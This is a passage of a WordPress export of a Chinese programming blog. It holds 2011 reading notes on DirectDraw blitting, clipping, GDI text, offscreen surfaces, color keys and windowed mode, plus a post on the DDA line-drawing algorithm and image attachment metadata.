    LPRECT lpDestRect,
    LPDIRECTDRAWSURFACE7 lpDDSrcSurface,
    LPRECT lpSrcRect,
    DWORD dwFlags,
    LPDDBLTFX lpDDBltFx
);
[/c]


其中常用的 dwFlags 标志如下：

[c]
DDBLT_COLORFILL		//使用DDBLTFX结构的dwFillColor作为填充色
DDBLT_ROTATIONANGLE	//使用DDBLTFX结构的dwRotationAngle作为该表面的旋转角度
DDBLT_KEYSRC		//使用和源表面相关联的色彩关键字
DDBLT_ASYNC		//异步执行转换
DDBLT_WAIT		//等待直到blit能被执行
[/c]


DDBLTFX结构详见：<a href="http://msdn.microsoft.com/en-us/library/gg426100(v=VS.85).aspx">DDBLTFX structure</a>。Blt 函数使用 DirectDraw 裁剪器，BltFast 则没有，所以快些。

[c]
HRESULT BltFast(
    DWORD dwX,
    DWORD dwY,
    LPDIRECTDRAWSURFACE7 lpDDSrcSurface,
    LPRECT lpSrcRect,
    DWORD dwFlags,
    LPDDBLTFX lpDDBltFx
);
[/c]


dwFlags 标志如下：

[c]
DDBLTFAST_SRCCOLORKEY	//源色彩键的透明blit
DDBLTFAST_DESTCOLORKEY	//目标色彩键的透明blit
DDBLTFAST_NOCOLORKEY	//标准blit,不使用透明
DDBLT_WAIT		//等待直到blit能被执行
[/c]


注意 Blt 和 BltFast都是从目标表面上调用，而不是从源表面上调用。

<strong>裁剪</strong>
裁剪通常定义为：不绘制哪些落在视口（Viewport）或窗口（Window）之外的像素或图像元素。之前曾以为，裁剪的目的是为了省去不用绘制不可见部分的开销从而提搞效率，现在发现，裁剪的另一个目的是避免内存被覆写。

对于2D位图，DirectDraw 加速的<strong>仅仅</strong>是位图和 blitting 。也就意味着你必须自己裁剪画点或画线。DirectDraw 可以帮助裁剪位图，条件是位图正以 DirectDraw 表面的形式出现。

使用 DirectDrawClipper 进行裁剪步骤：
<ol>
	<li>创建 DirectDraw 裁剪器</li>
	<li>创建裁剪序列</li>
	<li>用 IDirectDrawClipper::SetClipList 将裁剪序列发送给裁剪器</li>
	<li>用 IDirectDrawSurface7::SetClipper 将裁剪器同窗口或表面关联</li>
</ol>
创建裁剪序列需要用到的结构体：
[c]
//RGNDATA
typedef struct _RGNDATA {
    RGNDATAHEADER   rdh;
    char            Buffer[1];
} RGNDATA;
//RGNDATAHEADER
typedef struct _RGNDATAHEADER {
    DWORD   dwSize;
    DWORD   iType;
    DWORD   nCount;
    DWORD   nRgnSize;
    RECT    rcBound;
} RGNDATAHEADER, *PRGNDATAHEADER;
[/c]
多数情况下，你会将裁剪器关联到你的离屏表面，例如后备缓冲表面，而不是后备缓冲表面。并且裁剪器并不关心模式，因为裁剪器并不关心模式，因为裁剪是在一个不同的级别被执行的，那是一个较为抽象的级别，因此每像素的位数并没有关系。

<strong>使用GDI</strong>
在 DirectDraw 模式下使用 GDI ，可以使用 IDirectDrawSurface::GetDC 从 DirectDraw 表面获得 GDI 兼容 DC 。一个打印文字的例子：
[c]
if (g_lpddBack-&gt;GetDC(&amp;hdc) == DD_OK) {
    RECT rect;
    SetTextColor(hdc, RGB(255,255,0));
    DrawText(hdc, &quot;hello&quot;, strlen(&quot;hello&quot;), &amp;strRect, DT_CENTER);
    g_lpddBack-&gt;ReleaseDC(hdc);
}
[/c] 
注意：这里所需要的色彩是 COLORREF，即24位RGB格式，它的问题是当DirectX 在调色板模式时，必须寻找最接近色彩同所需色彩相匹配，这个处理加上慢速的 GDI 操作，使得 GDI 打印文字变得很慢。]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>131</wp:post_id>
		<wp:post_date>2011-10-24 12:37:14</wp:post_date>
		<wp:post_date_gmt>2011-10-24 04:37:14</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>blitter%e3%80%81%e8%a3%81%e5%89%aa%e5%92%8cgdi</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
								<wp:postmeta>
		<wp:meta_key>_edit_last</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_edit_lock</wp:meta_key>
		<wp:meta_value><![CDATA[1343358985]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_syntaxhighlighter_encoded</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_wp_old_slug</wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>views</wp:meta_key>
		<wp:meta_value><![CDATA[34]]></wp:meta_value>
		</wp:postmeta>
							</item>
		<item>
		<title>离屏表面和窗口模式</title>
		<link>http://codemylife.blogcn.com/2011/10/%e7%a6%bb%e5%b1%8f%e8%a1%a8%e9%9d%a2%e5%92%8c%e7%aa%97%e5%8f%a3%e6%a8%a1%e5%bc%8f/</link>
		<pubDate>Sun, 30 Oct 2011 07:23:17 +0000</pubDate>
		<dc:creator><![CDATA[codemylife]]></dc:creator>
		
		<category domain="tag"><![CDATA[DirectDraw]]></category>

		<category domain="tag" nicename="directdraw"><![CDATA[DirectDraw]]></category>

		<category><![CDATA[Windows 游戏编程大师技巧]]></category>

		<category domain="category" nicename="tricks-of-the-windows-game-progrmming"><![CDATA[Windows 游戏编程大师技巧]]></category>

		<category><![CDATA[读书]]></category>

		<category domain="category" nicename="%e8%af%bb%e4%b9%a6"><![CDATA[读书]]></category>

		<guid isPermaLink="false">http://codemylife.blogcn.com/?p=136</guid>
		<description></description>
		<content:encoded><![CDATA[Chase excellence - Success will follow——《3 Idiots》

<strong>离屏表面</strong>
DirectDraw 存在的目的就是利用硬件加速，要利用法硬件加速就必须使用 DirectDraw 的数据结构和对象来保存位图，DirectDraw 是使用 blitter 的关键。创建离屏表面示例：
[c title="使用 SetColorKey"]
DDSURFACEDESC2 ddsd;
LPDIRECTDRAWSURFACE7 lpdds = NULL;
ZeroMemory(&amp;ddsd, sizeof(ddsd));
ddsd.dwSize = sizeof(ddsd);
ddsd.dwFlags = DDSD_CAPS | DDSD_WIDTH | DDSD_HEIGHT;
ddsd.ddsCaps.dwCaps = DDSCAPS_OFFSCREENPLAIN;
ddsd.dwWidth = bm.bmWidth;
ddsd.dwHeight = bm.bmHeight;
HRESULT hr = pdd-&gt;CreateSurface(&amp;ddsd, &amp;lpdds, NULL);
[/c]
或
[c]
DDSURFACEDESC2 ddsd;
LPDIRECTDRAWSURFACE7 lpdds = NULL;
ZeroMemory(&amp;ddsd, sizeof(ddsd));
ddsd.dwSize = sizeof(ddsd);
ddsd.dwFlags = DDSD_CAPS | DDSD_WIDTH | DDSD_HEIGHT | DDSD_CKSRCBLT;
ddsd.ddsCaps.dwCaps = DDSCAPS_OFFSCREENPLAIN;
ddsd.dwWidth = bm.bmWidth;
ddsd.dwHeight = bm.bmHeight;
ddsd.ddckCKSrcBlt.dwColorSpaceLowValue = low_color;
ddsd.ddckCKSrcBlt.dwColorSpaceLowValue = high_color;
HRESULT hr = pdd-&gt;CreateSurface(&amp;ddsd, &amp;lpdds, NULL);
[/c]
通常在拷贝一块位图的时候，你需要选择一种颜色作为透明色，这时就需要用到色彩键。你可以在创建表面的时候设置色彩键，也可以在创建表面之后使用函数 IDirectDrawSurface7::SetColorKey 设置。
[c]
DDCOLORKEY colorKey;
colorKey.dwColorSpaceLowValue = colorKey.dwColorSpaceHighValue = 0;
hr = g_lpddSpirit-&gt;SetColorKey(DDCKEY_SRCBLT, &amp;colorKey);
TraceDxErrRetLog(hr, &quot;SetColorKey error!\n&quot;, false);
[/c]
当把精灵表面拷贝到后备缓冲时，应当在精灵表面设置源色彩键，而不是后备缓冲表面。示例：<a href="http://testsuit.blogcn.com/2011/10/%E7%B2%BE%E7%81%B5%E7%A7%BB%E5%8A%A8/">精灵移动</a>。

<strong>窗口模式</strong>
窗口模式的 DirectDraw 程序的主表面就是整个显示屏幕，而不仅仅是你的窗口。这就意味着你必须找出你的窗口客户区的坐标，并确保只是在它上面操作。玩家可能移动或改变窗口尺寸，所以要处理WM_SIZE 和 WM_MOVE 消息。

第二个问题是8位调色板。如果视频是8位模式，你可以改变调色板，但是最好留下大约20个调色板（保留给Windows和系统色彩），这样使其他应用程序看起来比较正常。

最后，最明显的是问题是如何在不同的模式下，进行位 blit 和像素操作。一般你需要自己处理各种色彩深度。

另，在窗口模式下无需设置视频模式和创建从后备缓冲。在窗口模式下，无法进行页面切换。



]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>136</wp:post_id>
		<wp:post_date>2011-10-30 15:23:17</wp:post_date>
		<wp:post_date_gmt>2011-10-30 07:23:17</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>%e7%a6%bb%e5%b1%8f%e8%a1%a8%e9%9d%a2%e5%92%8c%e7%aa%97%e5%8f%a3%e6%a8%a1%e5%bc%8f</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
								<wp:postmeta>
		<wp:meta_key>views</wp:meta_key>
		<wp:meta_value><![CDATA[28]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_edit_last</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_edit_lock</wp:meta_key>
		<wp:meta_value><![CDATA[1343358971]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_syntaxhighlighter_encoded</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_wp_old_slug</wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							</item>
		<item>
		<title>line1</title>
		<link>http://codemylife.blogcn.com/2011/11/%e7%9b%b4%e7%ba%bfdda%e7%ae%97%e6%b3%95/line1/</link>
		<pubDate>Fri, 04 Nov 2011 10:00:59 +0000</pubDate>
		<dc:creator><![CDATA[codemylife]]></dc:creator>
		
		<guid isPermaLink="false">http://files.blogcn.com/wp03/M00/02/6F/wKgKC06zt9sAAAAAAAAdUlWxQS8369.jpg</guid>
		<description></description>
		<content:encoded><![CDATA[]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>140</wp:post_id>
		<wp:post_date>2011-11-04 18:00:59</wp:post_date>
		<wp:post_date_gmt>2011-11-04 10:00:59</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>line1</wp:post_name>
		<wp:status>inherit</wp:status>
		<wp:post_parent>139</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>attachment</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
				<wp:attachment_url>http://files.blogcn.com/wp03/M00/02/6F/wKgKC06zt9sAAAAAAAAdUlWxQS8369.jpg</wp:attachment_url>
								<wp:postmeta>
		<wp:meta_key>_wp_attachment_metadata</wp:meta_key>
		<wp:meta_value><![CDATA[a:6:{s:5:"width";s:3:"207";s:6:"height";s:3:"158";s:14:"hwstring_small";s:23:"height='96' width='125'";s:5:"sizes";a:2:{s:9:"thumbnail";a:3:{s:5:"width";s:2:"88";s:6:"height";s:2:"88";s:3:"url";s:73:"http://files.blogcn.com/wp04/M00/02/BD/wKgKDU6zt9sAAAAAAAAMfTUtF54835.jpg";}s:6:"medium";a:3:{s:5:"width";s:3:"188";s:6:"height";s:3:"143";s:3:"url";s:73:"http://files.blogcn.com/wp02/M00/02/F3/wKgKCk6zt9sAAAAAAAAYDwmY5yE384.jpg";}}s:10:"image_meta";a:10:{s:8:"aperture";s:1:"0";s:6:"credit";s:0:"";s:6:"camera";s:0:"";s:7:"caption";s:0:"";s:17:"created_timestamp";s:1:"0";s:9:"copyright";s:0:"";s:12:"focal_length";s:1:"0";s:3:"iso";s:1:"0";s:13:"shutter_speed";s:1:"0";s:5:"title";s:0:"";}s:3:"url";s:73:"http://files.blogcn.com/wp01/M00/03/43/wKgKC06zt9sAAAAAAAAdUhdNW0g066.jpg";}]]></wp:meta_value>
		</wp:postmeta>
							</item>
		<item>
		<title>tan</title>
		<link>http://codemylife.blogcn.com/2011/11/%e7%9b%b4%e7%ba%bfdda%e7%ae%97%e6%b3%95/tan/</link>
		<pubDate>Fri, 04 Nov 2011 10:17:42 +0000</pubDate>
		<dc:creator><![CDATA[codemylife]]></dc:creator>
		
		<guid isPermaLink="false">http://files.blogcn.com/wp03/M00/02/6F/wKgKC06zu8YAAAAAAAAkjwdwzhE151.jpg</guid>
		<description></description>
		<content:encoded><![CDATA[]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>141</wp:post_id>
		<wp:post_date>2011-11-04 18:17:42</wp:post_date>
		<wp:post_date_gmt>2011-11-04 10:17:42</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>tan</wp:post_name>
		<wp:status>inherit</wp:status>
		<wp:post_parent>139</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>attachment</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
				<wp:attachment_url>http://files.blogcn.com/wp03/M00/02/6F/wKgKC06zu8YAAAAAAAAkjwdwzhE151.jpg</wp:attachment_url>
								<wp:postmeta>
		<wp:meta_key>_wp_attachment_metadata</wp:meta_key>
		<wp:meta_value><![CDATA[a:6:{s:5:"width";s:3:"332";s:6:"height";s:3:"208";s:14:"hwstring_small";s:23:"height='80' width='128'";s:5:"sizes";a:2:{s:9:"thumbnail";a:3:{s:5:"width";s:2:"88";s:6:"height";s:2:"88";s:3:"url";s:73:"http://files.blogcn.com/wp04/M00/02/BD/wKgKDU6zu8YAAAAAAAANv1ki76E539.jpg";}s:6:"medium";a:3:{s:5:"width";s:3:"188";s:6:"height";s:3:"117";s:3:"url";s:73:"http://files.blogcn.com/wp01/M00/03/43/wKgKC06zu8YAAAAAAAAc4Tzl5DE605.jpg";}}s:10:"image_meta";a:10:{s:8:"aperture";s:1:"0";s:6:"credit";s:0:"";s:6:"camera";s:0:"";s:7:"caption";s:0:"";s:17:"created_timestamp";s:1:"0";s:9:"copyright";s:0:"";s:12:"focal_length";s:1:"0";s:3:"iso";s:1:"0";s:13:"shutter_speed";s:1:"0";s:5:"title";s:0:"";}s:3:"url";s:73:"http://files.blogcn.com/wp06/M00/03/F3/wKgKDE6zu8YAAAAAAAAkjwFlKEo903.jpg";}]]></wp:meta_value>
		</wp:postmeta>
							</item>
		<item>
		<title>ddaline</title>
		<link>http://codemylife.blogcn.com/2011/11/%e7%9b%b4%e7%ba%bfdda%e7%ae%97%e6%b3%95/ddaline/</link>
		<pubDate>Fri, 04 Nov 2011 10:46:21 +0000</pubDate>
		<dc:creator><![CDATA[codemylife]]></dc:creator>
		
		<guid isPermaLink="false">http://files.blogcn.com/wp06/M00/01/8C/wKgKDU6zwn0AAAAAAAAxm23q-84863.jpg</guid>
		<description></description>
		<content:encoded><![CDATA[]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>143</wp:post_id>
		<wp:post_date>2011-11-04 18:46:21</wp:post_date>
		<wp:post_date_gmt>2011-11-04 10:46:21</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>ddaline</wp:post_name>
		<wp:status>inherit</wp:status>
		<wp:post_parent>139</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>attachment</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
				<wp:attachment_url>http://files.blogcn.com/wp06/M00/01/8C/wKgKDU6zwn0AAAAAAAAxm23q-84863.jpg</wp:attachment_url>
								<wp:postmeta>
		<wp:meta_key>_wp_attachment_metadata</wp:meta_key>
		<wp:meta_value><![CDATA[a:6:{s:5:"width";s:3:"337";s:6:"height";s:3:"258";s:14:"hwstring_small";s:23:"height='96' width='125'";s:5:"sizes";a:2:{s:9:"thumbnail";a:3:{s:5:"width";s:2:"88";s:6:"height";s:2:"88";s:3:"url";s:73:"http://files.blogcn.com/wp01/M00/02/39/wKgKCk6zwn0AAAAAAAAOCTP9e1w272.jpg";}s:6:"medium";a:3:{s:5:"width";s:3:"188";s:6:"height";s:3:"143";s:3:"url";s:73:"http://files.blogcn.com/wp06/M00/03/F3/wKgKDE6zwn0AAAAAAAAcuQGGY-A557.jpg";}}s:10:"image_meta";a:10:{s:8:"aperture";s:1:"0";s:6:"credit";s:0:"";s:6:"camera";s:0:"";s:7:"caption";s:0:"";s:17:"created_timestamp";s:1:"0";s:9:"copyright";s:0:"";s:12:"focal_length";s:1:"0";s:3:"iso";s:1:"0";s:13:"shutter_speed";s:1:"0";s:5:"title";s:0:"";}s:3:"url";s:73:"http://files.blogcn.com/wp05/M00/02/BD/wKgKDE6zwn0AAAAAAAAxmzlQHrI870.jpg";}]]></wp:meta_value>
		</wp:postmeta>
							</item>
		<item>
		<title>DDAlineDemo</title>
		<link>http://codemylife.blogcn.com/2011/11/%e7%9b%b4%e7%ba%bfdda%e7%ae%97%e6%b3%95/ddalinedemo/</link>
		<pubDate>Tue, 08 Nov 2011 12:36:08 +0000</pubDate>
		<dc:creator><![CDATA[codemylife]]></dc:creator>
		
		<guid isPermaLink="false">http://files.blogcn.com/wp06/M00/01/96/wKgKDU65IjgAAAAAAAS0Nmx3SDo693.bmp</guid>
		<description></description>
		<content:encoded><![CDATA[]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>144</wp:post_id>
		<wp:post_date>2011-11-08 20:36:08</wp:post_date>
		<wp:post_date_gmt>2011-11-08 12:36:08</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>ddalinedemo</wp:post_name>
		<wp:status>inherit</wp:status>
		<wp:post_parent>139</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>attachment</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
				<wp:attachment_url>http://files.blogcn.com/wp06/M00/01/96/wKgKDU65IjgAAAAAAAS0Nmx3SDo693.bmp</wp:attachment_url>
								<wp:postmeta>
		<wp:meta_key>_wp_attachment_metadata</wp:meta_key>
		<wp:meta_value><![CDATA[a:0:{}]]></wp:meta_value>
		</wp:postmeta>
							</item>
		<item>
		<title>直线DDA算法</title>
		<link>http://codemylife.blogcn.com/2011/11/%e7%9b%b4%e7%ba%bfdda%e7%ae%97%e6%b3%95/</link>
		<pubDate>Tue, 08 Nov 2011 12:47:20 +0000</pubDate>
		<dc:creator><![CDATA[codemylife]]></dc:creator>
		
		<category domain="tag"><![CDATA[图形学]]></category>

		<category domain="tag" nicename="%e5%9b%be%e5%bd%a2%e5%ad%a6"><![CDATA[图形学]]></category>

		<category><![CDATA[计算机图形学导论]]></category>

		<category domain="category" nicename="%e8%ae%a1%e7%ae%97%e6%9c%ba%e5%9b%be%e5%bd%a2%e5%ad%a6%e5%af%bc%e8%ae%ba"><![CDATA[计算机图形学导论]]></category>

		<category><![CDATA[读书]]></category>

		<category domain="category" nicename="%e8%af%bb%e4%b9%a6"><![CDATA[读书]]></category>

		<guid isPermaLink="false">http://codemylife.blogcn.com/?p=139</guid>
		<description></description>
		<content:encoded><![CDATA[玉不琢，不成器，人不学，不知道。——《礼记．学记》

看《Windows 游戏大师编程技巧》到第8章被卡住了，于是买了本《图形学导论》啃起来了，发现一个很好的学习计算机图形学的网站：<a href="http://cg.sjtu.edu.cn/course_content.asp">上海交大图形学网</a>。

回顾一下直线相关的知识：

<strong>直线的斜率和倾斜角</strong>

直线在坐标轴上相对于x轴有一个倾斜度，这个倾斜度反映了直线的倾斜程度。<img class="alignright" style="float: right;" src="http://files.blogcn.com/wp03/M00/02/6F/wKgKC06zt9sAAAAAAAAdUlWxQS8369.jpg" alt="" width="207" height="158" />

倾斜角：一条直线 L 与 X 轴相交，如果 X 轴绕着交点按逆时针方向旋转到和直线 L 重合时所转的最小正角为 α ，则 α 叫直线L的倾斜角。

直线的斜率：
<div id="_mcePaste">
<ol>
	<li>当直线 L 的倾斜角 α 不等于90°时， α 的正切值即 tan α，叫做直线 L 的斜率，用  k  表示，即 k = tan α。</li>
	<li>当 α 等于90°时， tanα 不存在，所以 k 不存在。</li>
</ol>
</div>
<div id="_mcePaste">tanα 的曲线：</div>
<div><img class="aligncenter" src="http://files.blogcn.com/wp03/M00/02/6F/wKgKC06zu8YAAAAAAAAkjwdwzhE151.jpg" alt="" width="266" height="166" /></div>
<div><strong>直线的方程</strong></div>
<div>
<ul>
	<li>一般式：ax+by+c = 0，其中(a, b)不同时为0，适用于所有直线。</li>
	<li>点斜式：<span style="font-family: arial, 宋体, sans-serif; line-height: 24px;">y-y0=k(x-x0)，不适用于 k 不存在的情况（k 不存在时，直线为x = x0）。</span></li>
	<li><span style="font-family: arial, 宋体, sans-serif;"><span style="line-height: 24px;">截距式：</span></span><span style="font-family: arial, 宋体, sans-serif; line-height: 24px;">x/a+y/b=1，不适用于</span><span style="font-family: arial, 宋体, sans-serif; line-height: 24px;">和任意坐标轴垂直的直线和过原点的直线。</span></li>
	<li><span style="font-family: arial, 宋体, sans-serif;"><span style="line-height: 24px;">斜截式：y</span></span><span style="font-family: arial, 宋体, sans-serif; line-height: 24px;">=kx+b (k≠0)，当k&gt;0时，y 随 x 的增大而增大；当k&lt;0时，y 随 x 的增大而减小。</span></li>
	<li><span style="font-family: arial, 宋体, sans-serif; line-height: 24px;">两点式：</span><span style="font-family: arial, 宋体, sans-serif; line-height: 24px;">(y-y1)/(y2-y1)=(x-x1)/(x2-x1)，条件：</span><span style="font-family: arial, 宋体, sans-serif; line-height: 24px;">x1≠x2，y1≠y2。</span></li>
</ul>
</div>
<div><span style="font-family: arial, 宋体, sans-serif;"><span style="line-height: 24px;"><strong>DDA算法思想</strong></span></span></div>
<img class="alignright" src="http://files.blogcn.com/wp06/M00/01/8C/wKgKDU6zwn0AAAAAAAAxm23q-84863.jpg" alt="" width="270" height="206" />

设直线方程为y<span> </span><span>=kx+b，那么对于点(x<sub>i</sub>, y<sub>i</sub>)，</span>y<sub>i</sub> =kx<sub>i</sub>+b。并显示(x<sub>i, </sub>Round(y<sub>i</sub>))的像素，其中Round(y<sub>i</sub>) = Floor(0.5+y<sub>i</sub>)，也即当y<sub>i </sub>≥0.5时，y方向才上升一个点，这是为了选择离最接近实际直线的像素。

由于y<sub>i+1</sub> =kx<sub>i+1</sub>+b = k(x<sub>i</sub>+Δx)+b = y<sub>i</sub>+kΔx，当Δx = 1时，y<sub>i+1 = </sub>y<sub>i + k。</sub>

因此，x每增加一个像素，y就加上一个k，k是线的斜率。从而如果x<sub>i+1 </sub>= x<sub>i</sub> + 1，那么 y<sub>i+1 </sub><sub>= </sub>y<sub>i</sub> + k，也就是说， x 和 y的值可以根据前一点的值推算出来，这就是该方法称为增量算法的原因：在每一步，我们只根据前一步的结果进行增量计算即可！

根据<a href="http://cg.sjtu.edu.cn/lecture_site/chap2/main.htm">DDA算法</a>提供的首点校正，能更好的逼近直线，在 DirectDraw 中使用该算法在 640 * 480，8位模式下所画出的直线：
<img class="alignleft" style="float: left;" src="http://files.blogcn.com/wp06/M00/01/96/wKgKDU65IjgAAAAAAAS0Nmx3SDo693.bmp" alt="" width="640" height="480" />
代码见：<a href="http://testsuit.blogcn.com/2011/11/dda%E7%94%BB%E7%BA%BFdemo/">DDA算法Demo</a>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>139</wp:post_id>
		<wp:post_date>2011-11-08 20:47:20</wp:post_date>
		<wp:post_date_gmt>2011-11-08 12:47:20</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>%e7%9b%b4%e7%ba%bfdda%e7%ae%97%e6%b3%95</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
								<wp:postmeta>
		<wp:meta_key>_edit_last</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_edit_lock</wp:meta_key>
		<wp:meta_value><![CDATA[1343358946]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_wp_old_slug</wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>views</wp:meta_key>
		<wp:meta_value><![CDATA[36]]></wp:meta_value>
		</wp:postmeta>
							</item>
		<item>
		<title>Bresenham</title>
		<link>http://codemylife.blogcn.com/2011/11/%e7%9b%b4%e7%ba%bfbresenham%e7%ae%97%e6%b3%95/bresenham/</link>
		<pubDate>Wed, 09 Nov 2011 07:56:35 +0000</pubDate>
		<dc:creator><![CDATA[codemylife]]></dc:creator>
		
		<guid isPermaLink="false">http://files.blogcn.com/wp05/M00/02/D3/wKgKDE66MjMAAAAAAAAwuh3C90w885.jpg</guid>
		<description></description>
		<content:encoded><![CDATA[]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>146</wp:post_id>
		<wp:post_date>2011-11-09 15:56:35</wp:post_date>
		<wp:post_date_gmt>2011-11-09 07:56:35</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>bresenham</wp:post_name>
		<wp:status>inherit</wp:status>
		<wp:post_parent>145</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>attachment</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
				<wp:attachment_url>http://files.blogcn.com/wp05/M00/02/D3/wKgKDE66MjMAAAAAAAAwuh3C90w885.jpg</wp:attachment_url>
								<wp:postmeta>
		<wp:meta_key>_wp_attachment_metadata</wp:meta_key>
		<wp:meta_value><![CDATA[a:6:{s:5:"width";s:3:"286";s:6:"height";s:3:"220";s:14:"hwstring_small";s:23:"height='96' 